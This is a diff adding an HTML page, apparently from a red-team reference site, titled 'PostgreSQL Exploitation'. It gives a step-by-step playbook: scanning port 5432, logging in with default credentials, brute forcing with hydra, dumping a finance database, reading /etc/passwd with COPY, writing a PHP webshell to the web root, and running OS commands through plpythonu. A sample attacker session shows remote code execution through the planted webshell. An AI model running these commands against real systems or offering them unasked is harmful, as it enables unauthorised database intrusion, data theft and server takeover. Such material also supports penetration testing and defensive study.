@@ -1,0 +1,208 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">PostgreSQL Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Databases</strong> • Focus: <strong>PostgreSQL Abuse & RCE via Extensions</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    PostgreSQL (TCP/5432) is a powerful open-source relational database. 
+    Attackers exploit PostgreSQL through weak/default credentials, excessive 
+    privileges (SUPERUSER, CREATE, FILE), and vulnerable configurations. 
+    Exploitation techniques include brute forcing, dumping sensitive data, 
+    privilege escalation, and achieving remote code execution (RCE) via 
+    COPY commands, writable directories, or malicious extensions. 
+    PostgreSQL exploitation is critical in Red Team ops when targeting 
+    web apps, SaaS platforms, or enterprise infrastructure.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Weak Credentials:</strong> Default accounts (postgres/postgres) still common.</li>
+    <li><strong>No Encryption:</strong> Some deployments allow plaintext connections.</li>
+    <li><strong>Privilege Misconfigs:</strong> SUPERUSER or FILE privileges allow OS-level access.</li>
+    <li><strong>RCE via Extensions:</strong> Malicious UDFs or extensions abused for shell access.</li>
+    <li><strong>Wide Exposure:</strong> PostgreSQL often exposed on internet-facing apps.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify PostgreSQL service on TCP/5432.</li>
+    <li><strong>Authentication:</strong> Test weak/default passwords.</li>
+    <li><strong>Enumeration:</strong> List databases, schemas, roles, and privileges.</li>
+    <li><strong>Exfiltration:</strong> Dump sensitive data (users, creds, tokens).</li>
+    <li><strong>Exploitation:</strong> Abuse FILE/COPY to write files, or load malicious extensions for RCE.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan for PostgreSQL service on TCP/5432.</li>
+    <li>Attempt login with weak/default credentials.</li>
+    <li>Enumerate roles, schemas, and privileges.</li>
+    <li>Dump sensitive data with SQL queries or pg_dump.</li>
+    <li>Abuse privilege misconfigurations for RCE (COPY INTO FILE, extensions, UDFs).</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p5432 --script pgsql-info [target]
+
+# ------------------------------
+# Connect
+# ------------------------------
+psql -h [target] -p 5432 -U postgres
+PGPASSWORD=postgres psql -h [target] -U postgres
+
+# ------------------------------
+# Brute Force
+# ------------------------------
+hydra -l postgres -P rockyou.txt postgres://[target]/postgres
+
+# ------------------------------
+# Enumeration
+# ------------------------------
+\l                     -- list databases
+\dn                    -- list schemas
+\du                    -- list users/roles
+\dt                    -- list tables
+SELECT * FROM pg_user; -- dump users
+
+# ------------------------------
+# Dump Data
+# ------------------------------
+pg_dump -h [target] -U postgres -d finance > finance.sql
+
+# ------------------------------
+# Exploitation (requires FILE or SUPERUSER)
+# ------------------------------
+-- Read sensitive file
+COPY passwd FROM '/etc/passwd';
+
+-- Write webshell to Apache root
+COPY (SELECT '<?php system($_GET["cmd"]); ?>') 
+TO '/var/www/html/shell.php';
+
+-- Load malicious extension (pg_exec, plpython, etc.)
+CREATE EXTENSION plpythonu;
+DO $$ import os; os.system('id') $$;
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p5432 --script pgsql-info 192.168.1.100
+psql -h 192.168.1.100 -U postgres
+\l
+\du
+COPY (SELECT '<?php system($_GET["cmd"]); ?>') 
+TO '/var/www/html/shell.php';
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p5432 --script pgsql-info 192.168.1.100
+PORT     STATE SERVICE VERSION
+5432/tcp open  postgresql PostgreSQL 12.8
+
+[ saide ~ ]$ psql -h 192.168.1.100 -U postgres
+Password for user postgres: postgres
+psql (12.8)
+Type "help" for help.
+
+postgres=# \l
+  Name    |  Owner   | Encoding
+----------+----------+-----------
+ postgres | postgres | UTF8
+ finance  | postgres | UTF8
+
+postgres=# \du
+Role name | Attributes
+----------+-----------------------
+ postgres | Superuser, Create DB
+
+postgres=# COPY (SELECT '<?php system($_GET["cmd"]); ?>')
+TO '/var/www/html/shell.php';
+COPY 1
+
+[ saide ~ ]$ curl http://victim.local/shell.php?cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+[+] RCE achieved via PostgreSQL
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample PostgreSQL exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Service Discovery
+5432/tcp open  postgresql 12.8
+
+# Weak Credentials
+User: postgres
+Pass: postgres
+
+# Database Enumeration
+Databases: postgres, finance
+Roles: postgres (superuser)
+
+# Exploitation
+Webshell written to /var/www/html/shell.php
+
+# Proof of Exploitation
+Remote Code Execution → id → www-data access
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting PostgreSQL
+      </a>
+    </li>
+    <li>
+      <a href="https://attack.mitre.org/techniques/T1505/002/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        MITRE ATT&CK – SQL Stored Procedures (PostgreSQL)
+      </a>
+    </li>
+    <li>Red Team workflow: Discover → Brute force → Enum → Dump → Abuse FILE/ext → RCE pivot.</li>
+  </ul>
+</section>
